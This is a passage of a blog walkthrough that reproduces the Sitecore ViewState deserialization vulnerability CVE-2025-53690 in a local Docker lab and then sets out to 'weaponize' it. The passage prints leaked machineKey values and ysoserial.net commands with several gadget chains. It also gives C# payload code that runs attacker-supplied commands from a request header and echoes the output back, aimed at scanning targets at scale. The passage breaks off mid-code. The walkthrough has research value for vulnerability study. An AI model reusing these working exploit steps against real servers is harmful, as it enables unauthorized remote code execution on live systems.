</span></span></code></pre></td></tr></table></div></div><p>This step will take a long time to pull and build the Sitecore images â€” go grab a coffee or matcha (which i prefer) while it runs â˜•</p><p><strong>Note:</strong> To avoid port conflicts with containers, change BurpSuite&rsquo;s proxy port to e.g., 8081 (not 8080). Also check whether port 443 is free. If not, stop any process occupying it (IIS (W3SVC), IIS Express, VMware/Workstation, Skype/Teams, antivirus, etc.)</p><p>After the stack is ready, open <code>.env</code> to find the Sitecore instance URL.</p><p><img src=/p/cve-2025-53690/image18.png width=862 height=261 srcset="/p/cve-2025-53690/image18_hu_550a8fb989269a64.png 480w, /p/cve-2025-53690/image18_hu_68069ecf5334f8fa.png 1024w" loading=lazy class=gallery-image data-flex-grow=330 data-flex-basis=792px></p><p>Visit <code>https://xp0cm.localhost/</code> â€” Sitecore is now deployed :D</p><p><img src=/p/cve-2025-53690/image19.png width=1651 height=884 srcset="/p/cve-2025-53690/image19_hu_da0f909757545df1.png 480w, /p/cve-2025-53690/image19_hu_8aacaf925a877c4d.png 1024w" loading=lazy class=gallery-image data-flex-grow=186 data-flex-basis=448px></p><hr><h2 id=reproducing-the-poc>Reproducing the POC</h2><p>Time to reproduce the POC :D</p><p>Mandiant&rsquo;s blog shows the endpoint the attacker used: <strong><code>/sitecore/blocked.aspx</code></strong></p><p><img src=/p/cve-2025-53690/image20.png width=866 height=364 srcset="/p/cve-2025-53690/image20_hu_1d51feb3e88455e1.png 480w, /p/cve-2025-53690/image20_hu_149659607beb9afa.png 1024w" loading=lazy class=gallery-image data-flex-grow=237 data-flex-basis=570px></p><p>This endpoint was chosen because it contains a hidden form VIEWSTATE and is accessible without authentication.</p><p>If we request this endpoint on our instance we see an <code>&lt;input></code> tag containing a VIEWSTATE field and the page doesn&rsquo;t require authentication.</p><p><img src=/p/cve-2025-53690/image21.png width=1541 height=803 srcset="/p/cve-2025-53690/image21_hu_f0a1047d9398df63.png 480w, /p/cve-2025-53690/image21_hu_9ee3d96726fd4328.png 1024w" loading=lazy class=gallery-image data-flex-grow=191 data-flex-basis=460px></p><p>Posting any value to <code>__VIEWSTATE</code> at that endpoint returns a 500 error.</p><p><img src=/p/cve-2025-53690/image22.png width=1539 height=544 srcset="/p/cve-2025-53690/image22_hu_161ec87302daa762.png 480w, /p/cve-2025-53690/image22_hu_ee21755d5241a9ba.png 1024w" loading=lazy class=gallery-image data-flex-grow=282 data-flex-basis=678px></p><p>To emulate the vulnerable environment used in the CVE, edit the <code>web.config</code> inside the container <code>sitecore-xp0-cm-1</code> and add the leaked machineKey.</p><p>First run <code>docker ps</code> to get the container id.</p><p><img src=/p/cve-2025-53690/image23.png width=832 height=370 srcset="/p/cve-2025-53690/image23_hu_9af9918f49d7f9fd.png 480w, /p/cve-2025-53690/image23_hu_63c47cf39501b2ec.png 1024w" loading=lazy class=gallery-image data-flex-grow=224 data-flex-basis=539px></p><p>Copy <code>web.config</code> out of the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker <span class=nb>exec</span> 0b12db41956d powershell -NoProfile -Command <span class=s2>&#34;Get-Content -Raw &#39;C:\inetpub\wwwroot\web.config&#39;&#34;</span> &gt; web.config
</span></span></code></pre></td></tr></table></div></div><p>Open and add:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;system.web&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;machineKey</span> <span class=na>validationKey=</span><span class=s>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span> <span class=na>decryptionKey=</span><span class=s>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> <span class=na>validation=</span><span class=s>&#34;SHA1&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/system.web&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/cve-2025-53690/image24.png width=1884 height=362 srcset="/p/cve-2025-53690/image24_hu_16e2df4ba695aff1.png 480w, /p/cve-2025-53690/image24_hu_80a6e9629db1f294.png 1024w" loading=lazy class=gallery-image data-flex-grow=520 data-flex-basis=1249px></p><p>Write the edited <code>web.config</code> back into the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>type</span> web.config <span class=p>|</span> docker <span class=nb>exec</span> -i 0b12db41956d powershell -NoProfile -Command ^
</span></span><span class=line><span class=cl>  <span class=s2>&#34;</span><span class=nv>$in</span><span class=s2>=[Console]::In.ReadToEnd(); Set-Content -Path &#39;C:\inetpub\wwwroot\web.config&#39; -Value </span><span class=nv>$in</span><span class=s2> -Encoding UTF8&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Verify it&rsquo;s written successfully.</p><p><img src=/p/cve-2025-53690/image25.png width=1035 height=55 srcset="/p/cve-2025-53690/image25_hu_a034203d23f91499.png 480w, /p/cve-2025-53690/image25_hu_937b327feb1375ba.png 1024w" loading=lazy class=gallery-image data-flex-grow=1881 data-flex-basis=4516px></p><p>Next, consult Soroush Dalili&rsquo;s blog about exploiting ViewState deserialization:
<a class=link href=https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate target=_blank rel=noopener>https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate</a></p><p>We get a sample <code>ysoserial.net</code> command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\y</span>soserial.exe -p ViewState -g TextFormattingRunProperties -c <span class=s2>&#34;echo 123 &gt; c:\windows\temp\test.txt&#34;</span> --path<span class=o>=</span><span class=s2>&#34;/somepath/testaspx/test.aspx&#34;</span> --apppath<span class=o>=</span><span class=s2>&#34;/testaspx/&#34;</span> --decryptionalg<span class=o>=</span><span class=s2>&#34;AES&#34;</span> --decryptionkey<span class=o>=</span><span class=s2>&#34;34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887&#34;</span> --validationalg<span class=o>=</span><span class=s2>&#34;HMACSHA256&#34;</span> --validationkey<span class=o>=</span><span class=s2>&#34;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Replace <code>decryptionkey</code>, <code>validationalg</code>, and <code>validationkey</code> with the leaked machineKey values and set the path to <code>/sitecore/blocked.aspx</code>. The <code>apppath</code> and <code>decryptionalg</code> flags are optional, so the command becomes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class=s2>&#34;echo 123 &gt; c:\windows\temp\test.txt&#34;</span> --path<span class=o>=</span>/sitecore/blocked.aspx --decryptionkey<span class=o>=</span><span class=s2>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> --validationalg<span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> --validationkey<span class=o>=</span><span class=s2>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Running that generates a Base64 VIEWSTATE containing our payload.</p><p><img src=/p/cve-2025-53690/image26.png width=962 height=265 srcset="/p/cve-2025-53690/image26_hu_1755eafe5868ccc9.png 480w, /p/cve-2025-53690/image26_hu_e738bcceb8429caf.png 1024w" loading=lazy class=gallery-image data-flex-grow=363 data-flex-basis=871px></p><p>Send that payload in <code>__VIEWSTATE</code> to <code>/sitecore/blocked.aspx</code>.</p><p><img src=/p/cve-2025-53690/image27.png width=1541 height=793 srcset="/p/cve-2025-53690/image27_hu_8b317e5822fc3a5b.png 480w, /p/cve-2025-53690/image27_hu_422e8f89ed3d0ed3.png 1024w" loading=lazy class=gallery-image data-flex-grow=194 data-flex-basis=466px></p><p>Check the temp folder to see if <code>test.txt</code> is written:</p><p><img src=/p/cve-2025-53690/image28.png width=531 height=445 srcset="/p/cve-2025-53690/image28_hu_da25e254adf304.png 480w, /p/cve-2025-53690/image28_hu_696948d8c77108f9.png 1024w" loading=lazy class=gallery-image data-flex-grow=119 data-flex-basis=286px></p><p>No test file â€” payload didn&rsquo;t work :DDD</p><p>To find the problem, we need to read the debug logs and stack trace. By default, Sitecore does not enable debug, so edit <code>web.config</code> to change:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;customErrors</span> <span class=na>mode=</span><span class=s>&#34;RemoteOnly&#34;</span><span class=nt>/&gt;</span> -&gt; <span class=nt>&lt;customErrors</span> <span class=na>mode=</span><span class=s>&#34;Off&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>and</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;compilation</span> <span class=na>defaultLanguage=</span><span class=s>&#34;c#&#34;</span> <span class=na>targetFramework=</span><span class=s>&#34;4.8&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>-&gt; 
</span></span><span class=line><span class=cl><span class=nt>&lt;compilation</span> <span class=na>defaultLanguage=</span><span class=s>&#34;c#&#34;</span> <span class=na>debug=</span><span class=s>&#34;true&#34;</span> <span class=na>targetFramework=</span><span class=s>&#34;4.8&#34;</span><span class=nt>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Re-send the request and observe the stack trace:</p><p><img src=/p/cve-2025-53690/image29.png width=755 height=715 srcset="/p/cve-2025-53690/image29_hu_aa7b843672c9bcef.png 480w, /p/cve-2025-53690/image29_hu_f6f9ceab412faae0.png 1024w" loading=lazy class=gallery-image data-flex-grow=105 data-flex-basis=253px></p><p>We successfully triggered deserialization â€” the stack trace reaches <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize</code> â€” but fails later at <code>System.Runtime.Serialization.Formatters.Binary.BinaryAssemblyInfo.GetAssembly</code> with:</p><p><code>[c: Unable to find assembly 'Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'.]</code></p><p>This error is because the gadget chain used the <code>TextFormattingRunProperties</code> class from the <code>Microsoft.PowerShell.Editor</code> assembly, which isn&rsquo;t present on the web server&rsquo;s <code>bin</code> directory. So the assembly can&rsquo;t be loaded.</p><p><img src=/p/cve-2025-53690/image30.png width=1036 height=527 srcset="/p/cve-2025-53690/image30_hu_53ab0b8e46267996.png 480w, /p/cve-2025-53690/image30_hu_b47622f5840f23ca.png 1024w" loading=lazy class=gallery-image data-flex-grow=196 data-flex-basis=471px></p><p>Inspect the ysoserial.net generator for <code>TextFormattingRunProperties</code>:</p><p><a class=link href=https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs target=_blank rel=noopener>https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs</a></p><p>We confirm the payload uses <code>TextFormattingRunProperties</code> from that assembly.</p><p><img src=/p/cve-2025-53690/image31.png width=1606 height=925 srcset="/p/cve-2025-53690/image31_hu_2ace776f734779bf.png 480w, /p/cve-2025-53690/image31_hu_76a2a123a1d8511c.png 1024w" loading=lazy class=gallery-image data-flex-grow=173 data-flex-basis=416px></p><p>We need a gadget chain that doesn&rsquo;t depend on that assembly. After reviewing generators and related blogs, we find the <code>TypeConfuseDelegate</code> gadget, discussed here:</p><p><a class=link href=https://testbnull.medium.com/deep-inside-typeconfusedelegate-gadgetchain-456915ed646a target=_blank rel=noopener>https://testbnull.medium.com/deep-inside-typeconfusedelegate-gadgetchain-456915ed646a</a></p><p><img src=/p/cve-2025-53690/image32.png width=1318 height=494 srcset="/p/cve-2025-53690/image32_hu_fa9350ee1a2b890e.png 480w, /p/cve-2025-53690/image32_hu_da49245b7e1a47bb.png 1024w" loading=lazy class=gallery-image data-flex-grow=266 data-flex-basis=640px></p><p><code>TypeConfuseDelegate</code>&rsquo;s call stack starts from <code>SortedSet</code>, a core class available in <code>mscorlib.dll</code> (the Microsoft Common Object Runtime Library), which is almost always present â€” making it portable and more likely to work on target servers. This chain should allow RCE.</p><p>Generate a payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c <span class=s2>&#34;echo 123 &gt; c:\windows\temp\test.txt&#34;</span> --path<span class=o>=</span>/sitecore/blocked.aspx --decryptionkey<span class=o>=</span><span class=s2>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> --validationalg<span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> --validationkey<span class=o>=</span><span class=s2>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Send the payload; the response no longer contains <code>SerializationException</code> â€” deserialization succeeded. Check for our file:</p><p><img src=/p/cve-2025-53690/image33.png width=3176 height=1665 srcset="/p/cve-2025-53690/image33_hu_8bd27ffd7337c537.png 480w, /p/cve-2025-53690/image33_hu_541d3c86da52de04.png 1024w" loading=lazy class=gallery-image data-flex-grow=190 data-flex-basis=457px></p><p><img src=/p/cve-2025-53690/image34.png width=946 height=617 srcset="/p/cve-2025-53690/image34_hu_8d6aee944dd66f8d.png 480w, /p/cve-2025-53690/image34_hu_92518807f193f21.png 1024w" loading=lazy class=gallery-image data-flex-grow=153 data-flex-basis=367px></p><p>We achieved RCE :D</p><hr><h2 id=weaponize-the-poc>Weaponize the POC</h2><p>However, there is a weakness when using this chain in practice. There will be cases where the target does not allow outbound connections, leaving us with no way to read the command&rsquo;s output (e.g., DNS, reverse shell, etc.). The method of writing a webshell is also not feasible if the webroot is unknown â‡’ There is no way to confirm if our payload was successful. So, how can we write an exploitation/detection script to scan at scale?</p><h3 id=echo-technique>Echo technique</h3><p>The solution here is the Echo technique. This technique works by accessing the request and response objects â‡’ then writing the command&rsquo;s output into the response so it can be observed.</p><p>There are several ways to achieve this, but the most optimal and simplest way in C# applications is to use a gadget chain that allows loading an arbitrary assembly. Therefore, we can embed our own custom-created assembly â‡’ executing arbitrary code. From there, we can call <code>System.Web.HttpContext.Current.Response</code> to write the command output to the response.</p><p>Among the gadget chains in <a class=link href=http://ysoserial.net/ target=_blank rel=noopener>ysoserial.net</a>, the <strong><code>ActivitySurrogateSelectorFromFile</code></strong> gadget chain can be used for this purpose. This is a variant of the <strong><code>ActivitySurrogateSelector</code></strong> chain.</p><p>A brief note on what makes this chain different: For traditional chains, we need to use <strong><code>Serializable</code></strong> objects in the chain. However, with this chain, we can deserialize almost anything :D. This opens the door for us to write output to the response via an object we create ourselves.</p><p><img src=/p/cve-2025-53690/image35.png width=1356 height=1245 srcset="/p/cve-2025-53690/image35_hu_e9e5c5f94db45d1.png 480w, /p/cve-2025-53690/image35_hu_cc2a4046b18a5632.png 1024w" loading=lazy class=gallery-image data-flex-grow=108 data-flex-basis=261px></p><p>You can learn more about this chain from the chain&rsquo;s author&rsquo;s blog here: <a class=link href=https://googleprojectzero.blogspot.com/2017/04/ target=_blank rel=noopener>https://googleprojectzero.blogspot.com/2017/04/</a></p><p>However, the limitation of this chain is that it only works with .Net Framework versions &lt; 4.8. This is because version 4.8+ implemented a checking mechanism for the <code>ActivitySurrogateSelector</code> Type â‡’ preventing it from being triggered directly from the start.</p><p>Still, this mechanism can be bypassed by using the <code>ActivitySurrogateDisableTypeCheck</code> chain. Specifics about this chain can be read on the author&rsquo;s blog here: <a class=link href=https://www.netspi.com/blog/technical-blog/adversary-simulation/re-animating-activitysurrogateselector/ target=_blank rel=noopener>https://www.netspi.com/blog/technical-blog/adversary-simulation/re-animating-activitysurrogateselector/</a></p><p>If we use this chain, we will have to send 2 requests (1 request to disable the type check, and 1 request to exploit the <code>ActivitySurrogateSelectorFromFile</code> chain) â‡’ This is still not the most optimal chain in this case :D</p><p>Let&rsquo;s look at other chains that also have the FromFile suffix in ysoserial.net. We have two chains: <code>DataSetOldBehaviourFromFile</code> and <code>XamlAssemblyLoadFromFile</code>.</p><p>Trying to generate a payload with the DataSetOldBehaviourFromFile chain, we see an error message:</p><p><img src=/p/cve-2025-53690/image36.png width=2354 height=297 srcset="/p/cve-2025-53690/image36_hu_9853c9eb0f1e30e4.png 480w, /p/cve-2025-53690/image36_hu_da4c40b961a9abe3.png 1024w" loading=lazy class=gallery-image data-flex-grow=792 data-flex-basis=1902px></p><p>The error is because the generated payload is too large, leading to an error during the string escaping process for the payload â‡’ this is definitely not optimal for the VIEWSTATE deserialize case :D</p><p>Let&rsquo;s try the <code>XamlAssemblyLoadFromFile</code> chain. This chain originated from the author&rsquo;s analysis of the <code>ActivitySurrogateDisableTypeCheck</code> chain. The author observed that this disable-chain leverages the <code>TextFormattingRunProperties</code> chain&rsquo;s mechanism of running arbitrary code using XAML, and from there, uses Reflection to disable the type check mechanism. â‡’ If it can run code, it can certainly also load an arbitrary assembly using code â‡’ This led to the creation of this chain.</p><p>Details can be found at: <a class=link href=https://russtone.io/2023/05/30/programming-with-xaml/ target=_blank rel=noopener>https://russtone.io/2023/05/30/programming-with-xaml/</a> This is also a very good article and should be read to clearly understand the formation process of this chain :D</p><p>Okay, no more talking, now run this command to generate the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>ysoserial</span><span class=p>.</span><span class=py>exe</span> <span class=n>-p</span> <span class=n>ViewState</span> <span class=n>-g</span> <span class=n>XamlAssemblyLoadFromFile</span> <span class=n>-c</span> <span class=s2>&#34;ExploitClass.cs;System.Web.dll;System.dll&#34;</span> <span class=p>-</span><span class=n>-path</span><span class=p>=/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>blocked</span><span class=p>.</span><span class=py>aspx</span> <span class=p>-</span><span class=n>-decryptionkey</span><span class=p>=</span><span class=s2>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> <span class=p>-</span><span class=n>-validationalg</span><span class=p>=</span><span class=s2>&#34;SHA1&#34;</span> <span class=p>-</span><span class=n>-validationkey</span><span class=p>=</span><span class=s2>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>But first, we need to clearly understand how ysoserial works for chains with the FromFile suffix. For these chains, in the -c flag, instead of passing the command you want to execute, you will first pass the path to the exploit payload file, followed by the paths to the DLL files used in the payload.</p><p><img src=/p/cve-2025-53690/image37.png width=1796 height=571 srcset="/p/cve-2025-53690/image37_hu_b305f20ba58ee3a9.png 480w, /p/cve-2025-53690/image37_hu_5d614a3d7c38d861.png 1024w" loading=lazy class=gallery-image data-flex-grow=314 data-flex-basis=754px></p><p>This class is already available in the ExploitClass.cs file in the ysoserial.net directory with sample code. We just need to customize it to run the command and print the output. The default payload will be:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl>    <span class=n>System</span><span class=p>.</span><span class=n>Windows</span><span class=p>.</span><span class=n>Forms</span><span class=p>.</span><span class=n>MessageBox</span><span class=p>.</span><span class=n>Show</span><span class=p>(</span><span class=s>&#34;Pwned&#34;</span><span class=p>,</span> <span class=s>&#34;Pwned&#34;</span><span class=p>,</span> <span class=n>System</span><span class=p>.</span><span class=n>Windows</span><span class=p>.</span><span class=n>Forms</span><span class=p>.</span><span class=n>MessageBoxButtons</span><span class=p>.</span><span class=n>OK</span><span class=p>,</span> <span class=n>System</span><span class=p>.</span><span class=n>Windows</span><span class=p>.</span><span class=n>Forms</span><span class=p>.</span><span class=n>MessageBoxIcon</span><span class=p>.</span><span class=n>Error</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>This payload, when triggered, will pop up a MessageBox window with the content &ldquo;Pwned&rdquo;. However, since we are exploiting via an HTTP request and cannot see the MessageBox, we will comment out this line.</p><p>In this case, for easier detection, we will first write an arbitrary value to the response header to identify it and end the response immediately to prevent the entire .NET pipeline afterward from overwriting the header during error generation. Uncomment the following two lines:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>AddHeader</span><span class=p>(</span><span class=s>&#34;X-YSOSERIAL-NET&#34;</span><span class=p>,</span><span class=s>&#34;HERE&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/cve-2025-53690/image38.png width=2606 height=1518 srcset="/p/cve-2025-53690/image38_hu_5200bd496913b27a.png 480w, /p/cve-2025-53690/image38_hu_127599e9becd8944.png 1024w" loading=lazy class=gallery-image data-flex-grow=171 data-flex-basis=412px></p><p>Since this payload uses <code>System.Web.HttpContext.Current.Response</code>, we need to add the path to the System.Web.dll assembly in the -c parameter. These DLL files can be found in the .NET Framework directory on drive C (e.g., C:\Windows\Microsoft.NET\Framework64\v4.0.30319). For convenience and to shorten the command, we should copy these DLL files directly into the ysoserial.net directory. Then run the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>ysoserial</span><span class=p>.</span><span class=py>exe</span> <span class=n>-p</span> <span class=n>ViewState</span> <span class=n>-g</span> <span class=n>XamlAssemblyLoadFromFile</span> <span class=n>-c</span> <span class=s2>&#34;ExploitClass.cs;System.Web.dll&#34;</span> <span class=p>-</span><span class=n>-path</span><span class=p>=/</span><span class=n>sitecore</span><span class=p>/</span><span class=n>blocked</span><span class=p>.</span><span class=py>aspx</span> <span class=p>-</span><span class=n>-decryptionkey</span><span class=p>=</span><span class=s2>&#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&#34;</span> <span class=p>-</span><span class=n>-validationalg</span><span class=p>=</span><span class=s2>&#34;SHA1&#34;</span> <span class=p>-</span><span class=n>-validationkey</span><span class=p>=</span><span class=s2>&#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>After sending the generated payload, we get the following response:</p><p><img src=/p/cve-2025-53690/image39.png width=3164 height=1746 srcset="/p/cve-2025-53690/image39_hu_f7bfeba71e3e81a2.png 480w, /p/cve-2025-53690/image39_hu_dc81df0de9157c5a.png 1024w" loading=lazy class=gallery-image data-flex-grow=181 data-flex-basis=434px></p><p>As we can see, the response no longer returns 500, and the header value we set has been returned in the response.</p><p>So, with just one request, we can make the server execute arbitrary code. Now we just need to recode the payload to get the cmd value from the request (which can be in a parameter, header, etc.) and return the output in the response.</p><p>We will code it as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=kt>string</span> <span class=n>cmd</span> <span class=p>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>Headers</span><span class=p>[</span><span class=s>&#34;cmd&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>System</span><span class=p>.</span><span class=n>Diagnostics</span><span class=p>.</span><span class=n>Process</span> <span class=n>process</span> <span class=p>=</span> <span class=k>new</span> <span class=n>System</span><span class=p>.</span><span class=n>Diagnostics</span><span class=p>.</span><span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>Arguments</span> <span class=p>=</span> <span class=s>&#34;/c &#34;</span> <span class=p>+</span> <span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>CreateNoWindow</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=n>process</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kt>string</span> <span class=n>output</span> <span class=p>=</span> <span class=n>process</span><span class=p>.</span><span class=n>StandardOutput</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>System</span><span class=p>.</span><span class=n>Web</span><span class=p>.</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>We will retrieve the cmd value from the request header, then run the command and return the output in the response body. Here, we additionally use <code>System.Diagnostics.Process</code>, a class from the <code>System.dll</code> assembly, so we need to copy this assembly into the ysoserial.net directory and add it to the <code>-c</code> flag of the command.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
